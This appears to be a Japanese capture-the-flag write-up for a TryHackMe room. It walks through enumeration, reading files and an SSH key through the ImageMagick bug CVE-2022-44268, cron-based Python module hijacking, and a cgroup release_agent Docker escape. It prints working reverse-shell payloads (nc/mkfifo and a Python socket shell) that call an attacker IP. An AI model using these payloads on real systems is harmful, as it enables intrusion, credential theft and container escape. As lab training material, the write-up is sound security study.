# DockMagic CTF

https://tryhackme.com/room/dockmagic

## Enumeration

```shell
$ TARGET=10.10.33.197
sudo bash -c "echo $TARGET   site.empman.thm empman.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-23-175:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-23 05:17 BST
Nmap scan report for dockmagic.thm (10.10.33.197)
Host is up (0.000097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:22:11:55:C9:53 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds
root@ip-10-10-23-175:~# sudo nmap -sS -A -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-23 05:17 BST
Nmap scan report for dockmagic.thm (10.10.33.197)
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 404 Not Found
MAC Address: 02:22:11:55:C9:53 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms dockmagic.thm (10.10.33.197)
```

SSH, HTTP

### サブドメイン

```shell
ffuf -u http://empman.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.empman.thm' -fs 0

backup                  [Status: 200, Size: 255, Words: 56, Lines: 8]
site                    [Status: 200, Size: 4611, Words: 839, Lines: 97]
```

backup サブドメインを発見。

### gobuster

empman

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://site.empman.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

backup サブドメインの方も何も出なかった。

## ImageMagic.zip

backup サブドメインにアクセスしたときリスト表示された zip ファイル。

TODO ファイル

```
$ cat TODO
1. Implement Basic Authentication with avatar support (use MiniMagick for Image Processing ) - DONE
2. Implement a temporary Front page with some dummy content. - DONE
3. Implement minimum viable product. - IN PROGRESS

serious (TO BE DONE):
1. Revoke user's ssh keys.
2. Switch from minimagick to vips due to recent discovery of security vulnerabilities in ImageMagick.
```

- ユーザーの SSH キーがある
- minimagick の脆弱性がある

README.md

```
The current release is the ImageMagick 7.1.0 series.
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png

以前、別の CTF で使ったことがあるこのペイロードを使って、下記の内容を PNG として保存し、ユーザー登録時のアバターとして設定した。  
→ 　エラー発生し、その後システムエラーで二度と画面表示できなくなった。

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f'
pop graphic-context
pop graphic-context
```

## CVE-2022-44268

https://git.rotfl.io/v/CVE-2022-44268

```shell
$ git clone https://git.rotfl.io/v/CVE-2022-44268.git
$ CVE-2022-44268
$ cargo run "/etc/passwd"
$ ls
Cargo.lock  Cargo.toml  image.png  README.md  screens  src  target
```

image.png をアバター画像としてアップロード。

画面に表示された画像をダウンロードして保存。

```sh
$ identify -verbose ./image2.png
（中略）
    1370
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
（以下略）
```

デコード

```sh
python3 -c 'print(bytes.fromhex("[略]").decode("utf-8"))'
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
Debian-exim:x:105:108::/var/spool/exim4:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
emp:x:1000:1000::/home/emp:/bin/bash
```

同様にして、emp ユーザーの SSH 秘密鍵を得て、SSH 接続可能になる。

```sh
$ cargo run "/home/emp/.ssh/id_rsa"
```

```sh
$ ssh emp@10.10.253.192 -i ./id_rsa

emp@23348446b037:~$
```

フラグ１ゲット。

## 権限昇格１

```sh
emp@23348446b037:~$ cat ./test.sh
#!/bin/bash
export GEM_HOME=/home/emp/.gems
cd /home/emp/app
```

crontab

```sh
emp@23348446b037:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log
```

- root ユーザーがバックアップスクリプトを毎分起動している
- /dev/shm が PYTHONPATH の先頭に設定されている

```sh
emp@23348446b037:~$ ls -al /usr/local/sbin/backup.py
-rwxr--r-- 1 root root 224 Aug 15  2023 /usr/local/sbin/backup.py

emp@23348446b037:~$ cat /usr/local/sbin/backup.py
#custom backup script (to be created)
import cbackup
import time

# Start backup process
cbackup.init('/home/emp/app')
# log completion time
t=time.localtime()
current_time = time.strftime("%H:%M:%s", t)
print(current_time)
```

cbackup モジュールをインポートして、init 関数を実行している。

```sh
emp@23348446b037:~$ ls -al /dev/shm
total 0
drwxrwxrwt 2 root root  40 May 23 06:46 .
drwxr-xr-x 5 root root 340 May 23 06:46 ..
```

/dev/shm にファイルを作れるので、リバースシェルを置く。

```sh
emp@23348446b037:/dev/shm$ wget http://10.13.85.243:8000/cbackup.py

emp@23348446b037:/dev/shm$ cat ./cbackup.py
import socket,subprocess,os, pty;

def init(dummy):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.13.85.243",6666))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("sh")
```

root 取得成功。

```shell
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.253.192] 42314
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

フラグ２ゲット。

しかし、（ルーム名から予想していたが）見えるプロセスが少ないことからも分かる通り、まだコンテナのゲスト OS の中にいる状態。

```sh
# ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3   5784  3112 ?        Ss   06:46   0:00 /bin/bash ./c
root           8  0.0  0.4  13352  4016 ?        Ss   06:46   0:00 sshd: /usr/sb
root          15  0.0  0.2   5632  2288 ?        Ss   06:46   0:00 /usr/sbin/cro
root          17  0.0  0.4   8796  4324 ?        S    06:46   0:00 su - emp -c c
emp           18  0.1  9.8 1177672 96184 ?       Ssl  06:46   0:03 puma 5.6.5 (t
root         431  0.0  0.9  14508  8980 ?        Ss   07:09   0:00 sshd: emp [pr
emp          437  0.0  0.5  14508  5816 ?        S    07:09   0:00 sshd: emp@pts
emp          438  0.0  0.3   4156  3380 pts/0    Ss+  07:09   0:00 -bash
root         796  0.0  0.3   8584  3492 ?        S    07:28   0:00 /usr/sbin/CRO
root         799  0.0  0.0   2476   572 ?        Ss   07:28   0:00 /bin/sh -c PY
root         800  0.0  0.9  13668  9600 ?        R    07:28   0:00 python3 /usr/
root         802  0.0  0.0   2476   572 pts/1    Ss   07:28   0:00 sh
root         818  0.5  0.7  18356  7648 ?        Ss   07:29   0:00 /usr/sbin/exi
root         819  0.0  0.7  18356  7496 ?        Ss   07:29   0:00 /usr/sbin/exi
root         821  0.0  0.3   7120  3028 pts/1    R+   07:29   0:00 ps aux
```

## Docker エスケープ

ホスト OS へのエスケープを目指す。

docker クライアントは使える。

```sh
# which docker
which docker
/usr/bin/docker
```

capsh は入っていない。

```sh
# capsh --print
capsh --print
sh: 7: capsh: not found
```

cgroup v1 であることが分かる。

```sh
# mount | grep cgroup
mount | grep cgroup
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
```

cgroup v1 特化のエクスプロイト

```sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /exploit
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6667 >/tmp/f" >> /exploit
chmod a+x /exploit

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

ホスト OS の root を取れた。

```sh
$ nc -nlvp 6667
listening on [any] 6667 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.253.192] 39926
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

フラグ３ゲット。

```sh
# find / -type f -name 'flag3.txt'
/home/vagrant/flag3.txt
# cat /home/vagrant/flag3.txt
THM{............................}
```

## 振り返り

- identify コマンドで、`-verbose` のところを `-vervose` としていたことが原因でドハマリし、 2 時間以上無駄にするという馬鹿なことをした。エラーメッセージは正しく実装しましょう！
- コンテナ脆弱性ルームの復習としてこのチャレンジを選んだこともあり、それ以降は楽勝だった。順序が逆だったら厳しかったと思われる。
- PNG ペイロードを作る方法として、pngcrush コマンドで足す方法もあった。

https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

```
pngcrush -text a "profile" "/etc/hosts" vjp.png
```

ちなみにどちらの方法でも、exiftool でみると下記のような表示になる。

```
$ exiftool pngout.png
ExifTool Version Number         : 13.25
File Name                       : pngout.png
（中略）
Profile                         : /etc/hosts
Image Size                      : 555x600
Megapixels                      : 0.333
```
